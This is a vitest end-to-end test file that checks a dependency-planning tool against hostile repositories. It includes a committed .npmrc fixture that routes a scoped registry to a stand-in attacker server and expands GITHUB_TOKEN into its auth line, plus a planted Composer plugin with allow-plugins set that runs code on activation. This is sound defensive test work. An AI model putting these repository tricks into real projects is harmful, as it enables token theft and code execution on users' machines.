/**
 * `deps_update_plan` called directly on a hostile repository, with the real
 * package managers (each gated on its binary, so a skip reports as a skip).
 *
 * The tool plans; it must not run the repository's code, nor follow its
 * package configuration with the user's credentials. Composer loads the
 * plugins a committed `vendor/` holds — `config.allow-plugins` in the
 * repository's own composer.json lets them activate — on every command that
 * builds a Composer instance, `composer outdated --locked` included: the
 * plugin below wrote its marker before `--no-plugins` was passed. npm read
 * the repository's `.npmrc` and expanded `${GITHUB_TOKEN}` from the server's
 * environment into the request it sent the registry that file named.
 */

import { existsSync, mkdirSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:http';
import { join } from 'node:path';
import { afterAll, describe, expect, it } from 'vitest';
import { GuardianDatabase as Database } from '../../src/storage/db.js';
import type { PluginContext } from '../../src/context.js';
import { runMigrations } from '../../src/storage/migrations/runner.js';
import { Storage } from '../../src/storage/index.js';
import { TOOLS } from '../../src/tools/index.js';
import { isInstalled } from '../helpers/toolchain.js';
import { cleanupTempDirs, makeTempDir } from '../helpers/tempDir.js';

await import('../../src/tools/depsUpdatePlan.js');

afterAll(cleanupTempDirs);

const COMPOSER = await isInstalled('composer');
const NPM = await isInstalled('npm');
const TIMEOUT_MS = 240_000;

function makePlugin(projectPath: string): PluginContext {
  const db = new Database(':memory:');
  runMigrations(db);
  return {
    storage: new Storage(db),
    shell: { command: 'bash', args_prefix: [], needs_wsl_path_translate: false, label: 'fake' },
    scriptsDir: projectPath,
    progressNotifier: { send: () => {} },
  };
}

function write(root: string, rel: string, text: string): void {
  const path = join(root, ...rel.split('/'));
  mkdirSync(join(path, '..'), { recursive: true });
  writeFileSync(path, text, 'utf8');
}

const PLUGIN_PACKAGE = {
  name: 'evil/plugin',
  version: '1.0.0',
  version_normalized: '1.0.0.0',
  type: 'composer-plugin',
  require: { 'composer-plugin-api': '^2.0' },
  extra: { class: 'Evil\\Plugin' },
  autoload: { 'psr-4': { 'Evil\\': 'src/' } },
};

/** A registry that answers 404 to everything and records each request's Authorization header. */
async function recordingRegistry(): Promise<{ url: string; seen: Array<string | null>; close(): Promise<void> }> {
  const seen: Array<string | null> = [];
  const server = createServer((req, res) => {
    seen.push(req.headers.authorization ?? null);
    res.writeHead(404, { 'content-type': 'application/json' });
    res.end('{"error":"not found"}');
  });
  await new Promise<void>((done) => server.listen(0, '127.0.0.1', done));
  const address = server.address();
  const port = typeof address === 'object' && address !== null ? address.port : 0;
  return {
    url: `http://127.0.0.1:${port}/`,
    seen,
    close: () => new Promise<void>((done) => server.close(() => done())),
  };
}

describe('deps_update_plan on a hostile repository (real tools, gated)', () => {
  it.skipIf(!NPM)(
    "npm: a committed .npmrc's registry never receives the token it names",
    async () => {
      const attacker = await recordingRegistry();
      const own = await recordingRegistry();
      const saved = { token: process.env['GITHUB_TOKEN'], registry: process.env['NPM_CONFIG_REGISTRY'] };
      try {
        const project = makeTempDir('hostile-npm-');
        write(project, 'package.json', JSON.stringify({ name: 'x', version: '1.0.0', dependencies: { '@acme/util': '1.0.0' } }));
        const host = attacker.url.replace(/^http:/, '');
        // A scoped registry: the user's own `registry` (set below, in the
        // environment) outranks a project's plain `registry=`, never this.
        write(project, '.npmrc', `@acme:registry=${attacker.url}\n${host}:_authToken=\${GITHUB_TOKEN}\n`);
        process.env['GITHUB_TOKEN'] = 'ghp_e2e_token_never_sent';
        // The user's own registry, set the way a user sets it.
        process.env['NPM_CONFIG_REGISTRY'] = own.url;

        const tool = TOOLS.find((t) => t.name === 'deps_update_plan');
        if (tool === undefined) throw new Error('deps_update_plan not registered');
        await tool.handler({ project_path: project }, makePlugin(project));

        expect(attacker.seen).toEqual([]);
        expect(own.seen.length).toBeGreaterThan(0);
        expect(own.seen.every((auth) => auth === null)).toBe(true);
      } finally {
        if (saved.token === undefined) delete process.env['GITHUB_TOKEN'];
        else process.env['GITHUB_TOKEN'] = saved.token;
        if (saved.registry === undefined) delete process.env['NPM_CONFIG_REGISTRY'];
        else process.env['NPM_CONFIG_REGISTRY'] = saved.registry;
        await attacker.close();
        await own.close();
      }
    },
    TIMEOUT_MS,
  );

  it.skipIf(!COMPOSER)(
    'composer: a plugin a committed vendor/ holds never activates',
    async () => {
      const project = makeTempDir('hostile-composer-');
      write(project, 'composer.json', JSON.stringify({
        require: { 'evil/plugin': '1.0.0' },
        config: { 'allow-plugins': { 'evil/plugin': true } },
      }));
      write(project, 'composer.lock', JSON.stringify({
        _readme: [], 'content-hash': 'x', packages: [PLUGIN_PACKAGE], 'packages-dev': [], aliases: [],
        'minimum-stability': 'stable', 'stability-flags': {}, 'prefer-stable': false, 'prefer-lowest': false,
        platform: {}, 'platform-dev': {}, 'plugin-api-version': '2.6.0',
      }));
      write(project, 'vendor/composer/installed.json', JSON.stringify({
        packages: [{ ...PLUGIN_PACKAGE, 'install-path': '../evil/plugin' }], dev: true, 'dev-package-names': [],
      }));
      const marker = join(project, 'PLUGIN_RAN').split('\\').join('/');
      write(project, 'vendor/evil/plugin/src/Plugin.php', [
        '<?php',
        'namespace Evil;',
        'use Composer\\Composer; use Composer\\IO\\IOInterface; use Composer\\Plugin\\PluginInterface;',
        'class Plugin implements PluginInterface {',
        `  public function activate(Composer $c, IOInterface $io) { file_put_contents('${marker}', 'ran'); }`,
        '  public function deactivate(Composer $c, IOInterface $io) {}',
        '  public function uninstall(Composer $c, IOInterface $io) {}',
        '}',
        '',
      ].join('\n'));

      const tool = TOOLS.find((t) => t.name === 'deps_update_plan');
      if (tool === undefined) throw new Error('deps_update_plan not registered');
      await tool.handler({ project_path: project }, makePlugin(project));
      expect(existsSync(join(project, 'PLUGIN_RAN'))).toBe(false);
    },
    TIMEOUT_MS,
  );
});
